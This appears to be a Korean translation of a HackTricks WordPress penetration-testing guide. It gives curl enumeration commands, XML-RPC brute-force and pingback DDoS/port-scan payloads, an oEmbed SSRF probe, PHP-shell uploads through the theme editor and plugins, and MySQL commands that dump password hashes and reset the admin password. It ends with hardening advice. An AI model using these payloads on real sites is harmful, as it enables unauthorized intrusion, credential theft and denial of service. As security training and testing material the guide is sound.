# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## 기본 정보

- **업로드된** 파일은 다음 위치에 저장됩니다: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **테마 파일은 /wp-content/themes/에서 찾을 수 있습니다.** 따라서 RCE를 얻기 위해 테마의 php를 변경하면 해당 경로를 사용할 가능성이 높습니다. 예를 들어, **테마 twentytwelve**를 사용하면 다음 위치에서 **404.php** 파일에 **접근**할 수 있습니다: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **또 다른 유용한 URL은 다음과 같습니다:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **wp-config.php**에서 데이터베이스의 루트 비밀번호를 찾을 수 있습니다.
- 확인할 기본 로그인 경로: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **주요 WordPress 파일**

- `index.php`
- `license.txt`는 설치된 WordPress 버전과 같은 유용한 정보를 포함합니다.
- `wp-activate.php`는 새 WordPress 사이트를 설정할 때 이메일 활성화 프로세스에 사용됩니다.
- 로그인 폴더(숨기기 위해 이름이 변경될 수 있음):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php`는 HTTP를 전송 메커니즘으로, XML을 인코딩 메커니즘으로 사용하여 데이터를 전송할 수 있게 해주는 WordPress의 기능을 나타내는 파일입니다. 이러한 유형의 통신은 WordPress [REST API](https://developer.wordpress.org/rest-api/reference)로 대체되었습니다.
- `wp-content` 폴더는 플러그인과 테마가 저장되는 주요 디렉토리입니다.
- `wp-content/uploads/`는 플랫폼에 업로드된 모든 파일이 저장되는 디렉토리입니다.
- `wp-includes/`는 인증서, 글꼴, JavaScript 파일 및 위젯과 같은 핵심 파일이 저장되는 디렉토리입니다.
- `wp-sitemap.xml`은 WordPress 버전 5.5 이상에서 모든 공개 게시물 및 공개 쿼리 가능한 게시물 유형과 분류법이 포함된 사이트맵 XML 파일을 생성합니다.

**포스트 익스플로잇**

- `wp-config.php` 파일은 데이터베이스 이름, 데이터베이스 호스트, 사용자 이름 및 비밀번호, 인증 키 및 솔트, 데이터베이스 테이블 접두사와 같은 데이터베이스에 연결하는 데 필요한 정보를 포함합니다. 이 구성 파일은 DEBUG 모드를 활성화하는 데에도 사용될 수 있으며, 이는 문제 해결에 유용할 수 있습니다.

### 사용자 권한

- **관리자**
- **편집자**: 자신의 게시물 및 다른 게시물을 게시하고 관리합니다.
- **저자**: 자신의 게시물을 게시하고 관리합니다.
- **기여자**: 자신의 게시물을 작성하고 관리하지만 게시할 수는 없습니다.
- **구독자**: 게시물을 탐색하고 자신의 프로필을 편집합니다.

## **수동 열거**

### **WordPress 버전 가져오기**

파일 `/license.txt` 또는 `/readme.html`을 찾을 수 있는지 확인합니다.

페이지의 **소스 코드** 내에서 (예: [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- CSS 링크 파일

![](<../../images/image (533).png>)

- JavaScript 파일

![](<../../images/image (524).png>)

### 플러그인 가져오기
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 테마 가져오기
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### 일반적으로 버전 추출하기
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## 능동적 열거

### 플러그인 및 테마

모든 플러그인과 테마를 찾는 것은 아마 불가능할 것입니다. 모든 것을 발견하기 위해서는 **플러그인 및 테마 목록을 능동적으로 브루트 포스해야 합니다** (다행히도 이러한 목록을 포함하는 자동화 도구가 있습니다).

### 사용자

- **ID 브루트:** 사용자 ID를 브루트 포스하여 WordPress 사이트에서 유효한 사용자를 얻습니다:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
응답이 **200** 또는 **30X**인 경우, id가 **유효**하다는 의미입니다. 응답이 **400**인 경우, id가 **유효하지** 않다는 의미입니다.

- **wp-json:** 사용자에 대한 정보를 쿼리하여 얻으려고 할 수도 있습니다:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
또 다른 `/wp-json/` 엔드포인트는 사용자에 대한 정보를 드러낼 수 있습니다:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
이 엔드포인트는 게시물을 작성한 사용자만 노출합니다. **이 기능이 활성화된 사용자에 대한 정보만 제공됩니다**.

또한 **/wp-json/wp/v2/pages**는 IP 주소를 유출할 수 있습니다.

- **로그인 사용자 이름 열거**: **`/wp-login.php`**에 로그인할 때 **메시지**는 **사용자 이름이 존재하는지 여부에 따라 다릅니다**.

### XML-RPC

`xml-rpc.php`가 활성화되어 있으면 자격 증명 무차별 대입 공격을 수행하거나 다른 리소스에 대한 DoS 공격을 시작하는 데 사용할 수 있습니다. (예를 들어 [이것을 사용하여](https://github.com/relarizky/wpxploit) 이 프로세스를 자동화할 수 있습니다).

활성화되어 있는지 확인하려면 _**/xmlrpc.php**_에 접근하고 이 요청을 보내십시오:

**확인**
```markup
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**자격 증명 무차별 대입**

**`wp.getUserBlogs`**, **`wp.getCategories`** 또는 **`metaWeblog.getUsersBlogs`**는 자격 증명을 무차별 대입하는 데 사용할 수 있는 방법 중 일부입니다. 이 중 하나라도 찾을 수 있다면 다음과 같은 것을 보낼 수 있습니다:
```markup
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
200 코드 응답 내의 메시지 _"잘못된 사용자 이름 또는 비밀번호"_는 자격 증명이 유효하지 않을 경우 나타나야 합니다.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

올바른 자격 증명을 사용하면 파일을 업로드할 수 있습니다. 응답에서 경로가 나타납니다 ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```markup
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
또한 **`system.multicall`**을 사용하여 자격 증명을 브루트 포스하는 **더 빠른 방법**이 있습니다. 이를 통해 동일한 요청에서 여러 자격 증명을 시도할 수 있습니다:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**2FA 우회**

이 방법은 프로그램을 위한 것이지 인간을 위한 것이 아니며, 오래된 것이기 때문에 2FA를 지원하지 않습니다. 따라서 유효한 자격 증명이 있지만 주요 출입구가 2FA로 보호되어 있는 경우, **xmlrpc.php를 악용하여 해당 자격 증명으로 2FA를 우회하여 로그인할 수 있을지도 모릅니다**. 콘솔을 통해 수행할 수 있는 모든 작업을 수행할 수는 없지만, Ippsec이 [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)에서 설명한 것처럼 RCE에 도달할 수 있을지도 모릅니다.

**DDoS 또는 포트 스캐닝**

목록에서 _**pingback.ping**_ 방법을 찾을 수 있다면, Wordpress가 임의의 요청을 어떤 호스트/포트로 보낼 수 있습니다.\
이를 사용하여 **수천** 개의 Wordpress **사이트**에 **하나의 위치**에 **접속**하도록 요청할 수 있습니다(따라서 해당 위치에서 **DDoS**가 발생함) 또는 **Wordpress**를 사용하여 일부 내부 **네트워크**를 **스캔**하도록 할 수 있습니다(어떤 포트도 지정할 수 있습니다).
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params><param>
<value><string>http://<YOUR SERVER >:<port></string></value>
</param><param><value><string>http://<SOME VALID BLOG FROM THE SITE ></string>
</value></param></params>
</methodCall>
```
![](../../images/1_JaUYIZF8ZjDGGB7ocsZC-g.png)

**faultCode**의 값이 **0** (17)보다 **크면**, 포트가 열려 있다는 의미입니다.

이 방법을 악용하여 DDoS를 유발하는 방법을 배우려면 이전 섹션에서 **`system.multicall`**의 사용을 살펴보세요.

**DDoS**
```markup
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param><value><string>http://target/</string></value></param>
<param><value><string>http://yoursite.com/and_some_valid_blog_post_url</string></value></param>
</params>
</methodCall>
```
![](<../../images/image (110).png>)

### wp-cron.php DoS

이 파일은 일반적으로 Wordpress 사이트의 루트에 존재합니다: **`/wp-cron.php`**\
이 파일이 **접근**될 때 "**무거운**" MySQL **쿼리**가 수행되므로, **공격자**가 **DoS**를 **유발**하는 데 사용할 수 있습니다.\
또한 기본적으로 `wp-cron.php`는 모든 페이지 로드 시(클라이언트가 Wordpress 페이지를 요청할 때마다) 호출되며, 트래픽이 많은 사이트에서는 문제가 발생할 수 있습니다(DoS).

Wp-Cron을 비활성화하고 호스트 내에서 필요한 작업을 정기적으로 수행하는 실제 cronjob을 생성하는 것이 권장됩니다(문제를 일으키지 않도록).

### /wp-json/oembed/1.0/proxy - SSRF

_https://worpress-site.com/wp-json/oembed/1.0/proxy?url=ybdk28vjsa9yirr7og2lukt10s6ju8.burpcollaborator.net_에 접근해 보세요. 그러면 Worpress 사이트가 귀하에게 요청을 보낼 수 있습니다.

작동하지 않을 때의 응답은 다음과 같습니다:

![](<../../images/image (365).png>)

## SSRF

{% embed url="https://github.com/t0gu/quickpress/blob/master/core/requests.go" %}

이 도구는 **methodName: pingback.ping**과 경로 **/wp-json/oembed/1.0/proxy**가 존재하는지 확인하고, 존재할 경우 이를 악용하려고 시도합니다.

## Automatic Tools
```bash
cmsmap -s http://www.domain.com -t 2 -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0"
wpscan --rua -e ap,at,tt,cb,dbe,u,m --url http://www.domain.com [--plugins-detection aggressive] --api-token <API_TOKEN> --passwords /usr/share/wordlists/external/SecLists/Passwords/probable-v2-top1575.txt #Brute force found users and search for vulnerabilities using a free API token (up 50 searchs)
#You can try to bruteforce the admin user using wpscan with "-U admin"
```
## 비트를 덮어써서 접근하기

실제 공격이라기보다는 호기심입니다. CTF [https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man](https://github.com/orangetw/My-CTF-Web-Challenges#one-bit-man)에서 워드프레스 파일의 비트 하나를 뒤집을 수 있었습니다. 따라서 `/var/www/html/wp-includes/user.php` 파일의 위치 `5389`를 뒤집어 NOT (`!`) 연산을 NOP로 만들 수 있었습니다.
```php
if ( ! wp_check_password( $password, $user->user_pass, $user->ID ) ) {
return new WP_Error(
```
## **패널 RCE**

**사용 중인 테마의 php 수정 (관리자 자격 증명 필요)**

모양 → 테마 편집기 → 404 템플릿 (오른쪽에서)

php 셸을 위한 내용을 변경합니다:

![](<../../images/image (384).png>)

업데이트된 페이지에 어떻게 접근할 수 있는지 인터넷에서 검색하세요. 이 경우 여기로 접근해야 합니다: [http://10.11.1.234/wp-content/themes/twentytwelve/404.php](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

### MSF

다음과 같이 사용할 수 있습니다:
```bash
use exploit/unix/webapp/wp_admin_shell_upload
```
to get a session.

## Plugin RCE

### PHP plugin

플러그인으로 .php 파일을 업로드할 수 있을 수 있습니다.\
예를 들어, php 백도어를 생성합니다:

![](<../../images/image (183).png>)

그런 다음 새 플러그인을 추가합니다:

![](<../../images/image (722).png>)

플러그인을 업로드하고 지금 설치를 누릅니다:

![](<../../images/image (249).png>)

계속 진행을 클릭합니다:

![](<../../images/image (70).png>)

아마도 이것은 겉으로는 아무것도 하지 않을 것입니다. 하지만 미디어로 가면 업로드된 셸을 볼 수 있습니다:

![](<../../images/image (462).png>)

접속하면 리버스 셸을 실행할 URL을 볼 수 있습니다:

![](<../../images/image (1006).png>)

### Uploading and activating malicious plugin

이 방법은 취약한 것으로 알려진 악성 플러그인을 설치하는 것을 포함하며, 이를 통해 웹 셸을 얻을 수 있습니다. 이 과정은 다음과 같이 WordPress 대시보드를 통해 수행됩니다:

1. **Plugin Acquisition**: 플러그인은 Exploit DB와 같은 출처에서 얻습니다 [**여기**](https://www.exploit-db.com/exploits/36374).
2. **Plugin Installation**:
- WordPress 대시보드로 이동한 후 `대시보드 > 플러그인 > 플러그인 업로드`로 이동합니다.
- 다운로드한 플러그인의 zip 파일을 업로드합니다.
3. **Plugin Activation**: 플러그인이 성공적으로 설치되면 대시보드를 통해 활성화해야 합니다.
4. **Exploitation**:
- "reflex-gallery" 플러그인이 설치되고 활성화되면, 취약한 것으로 알려져 있어 악용될 수 있습니다.
- Metasploit 프레임워크는 이 취약점에 대한 익스플로잇을 제공합니다. 적절한 모듈을 로드하고 특정 명령을 실행함으로써 meterpreter 세션을 설정하여 사이트에 대한 무단 접근을 허용합니다.
- 이는 WordPress 사이트를 악용하는 많은 방법 중 하나일 뿐입니다.

내용에는 플러그인을 설치하고 활성화하는 WordPress 대시보드의 단계를 보여주는 시각적 도구가 포함되어 있습니다. 그러나 이러한 방식으로 취약점을 악용하는 것은 적절한 권한 없이 불법이며 비윤리적이라는 점에 유의해야 합니다. 이 정보는 책임감 있게 사용해야 하며, 명시적인 허가가 있는 침투 테스트와 같은 법적 맥락에서만 사용해야 합니다.

**자세한 단계는 다음을 확인하세요:** [**https://www.hackingarticles.in/wordpress-reverse-shell/**](https://www.hackingarticles.in/wordpress-reverse-shell/)

## From XSS to RCE

- [**WPXStrike**](https://github.com/nowak0x01/WPXStrike): _**WPXStrike**_는 **Cross-Site Scripting (XSS)** 취약점을 **Remote Code Execution (RCE)** 또는 WordPress의 다른 중요한 취약점으로 상승시키기 위해 설계된 스크립트입니다. 자세한 내용은 [**이 게시물**](https://nowak0x01.github.io/papers/76bc0832a8f682a7e0ed921627f85d1d.html)을 확인하세요. **Wordpress Versions 6.X.X, 5.X.X 및 4.X.X를 지원하며 다음을 허용합니다:**
- _**Privilege Escalation:**_ WordPress에 사용자를 생성합니다.
- _**(RCE) Custom Plugin (backdoor) Upload:**_ 사용자 정의 플러그인(백도어)을 WordPress에 업로드합니다.
- _**(RCE) Built-In Plugin Edit:**_ WordPress의 내장 플러그인을 편집합니다.
- _**(RCE) Built-In Theme Edit:**_ WordPress의 내장 테마를 편집합니다.
- _**(Custom) Custom Exploits:**_ 서드파티 WordPress 플러그인/테마에 대한 사용자 정의 익스플로잇.

## Post Exploitation

Extract usernames and passwords:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;select concat_ws(':', user_login, user_pass) from wp_users;"
```
관리자 비밀번호 변경:
```bash
mysql -u <USERNAME> --password=<PASSWORD> -h localhost -e "use wordpress;UPDATE wp_users SET user_pass=MD5('hacked') WHERE ID = 1;"
```
## Wordpress 플러그인 펜테스트

### 공격 표면

Wordpress 플러그인이 기능을 어떻게 노출할 수 있는지를 아는 것은 그 기능에서 취약점을 찾는 데 핵심입니다. 플러그인이 기능을 어떻게 노출할 수 있는지에 대한 내용은 다음의 글머리 기호와 [**이 블로그 포스트**](https://nowotarski.info/wordpress-nonce-authorization/)의 취약한 플러그인 예시에서 확인할 수 있습니다.

- **`wp_ajax`**&#x20;

플러그인이 기능을 사용자에게 노출할 수 있는 방법 중 하나는 AJAX 핸들러를 통해서입니다. 이러한 핸들러는 논리, 권한 부여 또는 인증 버그를 포함할 수 있습니다. 게다가, 이러한 기능은 종종 인증 및 권한 부여가 Wordpress nonce의 존재에 기반하고 있으며, **Wordpress 인스턴스에 인증된 모든 사용자가 이를 가질 수 있습니다** (역할에 관계없이).

다음은 플러그인에서 기능을 노출하는 데 사용할 수 있는 함수입니다:
```php
add_action( 'wp_ajax_action_name', array(&$this, 'function_name'));
add_action( 'wp_ajax_nopriv_action_name', array(&$this, 'function_name'));
```
**`nopriv`의 사용은 모든 사용자(인증되지 않은 사용자 포함)가 엔드포인트에 접근할 수 있게 만듭니다.**

> [!CAUTION]
> 게다가, 만약 함수가 `wp_verify_nonce` 함수를 사용하여 사용자의 권한을 확인하고 있다면, 이 함수는 사용자가 로그인했는지만 확인하고, 일반적으로 사용자의 역할을 확인하지 않습니다. 따라서 권한이 낮은 사용자가 권한이 높은 작업에 접근할 수 있습니다.

- **REST API**

`register_rest_route` 함수를 사용하여 wordpress에서 함수를 노출하는 것도 가능합니다:
```php
register_rest_route(
$this->namespace, '/get/', array(
'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback`는 주어진 사용자가 API 메서드를 호출할 수 있는 권한이 있는지 확인하는 함수에 대한 콜백입니다.

**내장된 `__return_true` 함수가 사용되면, 사용자 권한 확인을 단순히 건너뜁니다.**

- **php 파일에 대한 직접 접근**

물론, WordPress는 PHP를 사용하며 플러그인 내부의 파일은 웹에서 직접 접근할 수 있습니다. 따라서 플러그인이 파일에 접근하는 것만으로 트리거되는 취약한 기능을 노출하는 경우, 모든 사용자가 이를 악용할 수 있습니다.

## WordPress 보호

### 정기 업데이트

WordPress, 플러그인 및 테마가 최신 상태인지 확인하십시오. 또한 wp-config.php에서 자동 업데이트가 활성화되어 있는지 확인하십시오:
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
또한, **신뢰할 수 있는 WordPress 플러그인과 테마만 설치하세요**.

### 보안 플러그인

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **기타 권장 사항**

- 기본 **admin** 사용자 제거
- **강력한 비밀번호**와 **2FA** 사용
- 주기적으로 **사용자 권한** 검토
- 무차별 대입 공격을 방지하기 위해 **로그인 시도 제한**
- **`wp-admin.php`** 파일 이름 변경 및 내부 또는 특정 IP 주소에서만 접근 허용.

{{#include ../../banners/hacktricks-training.md}}
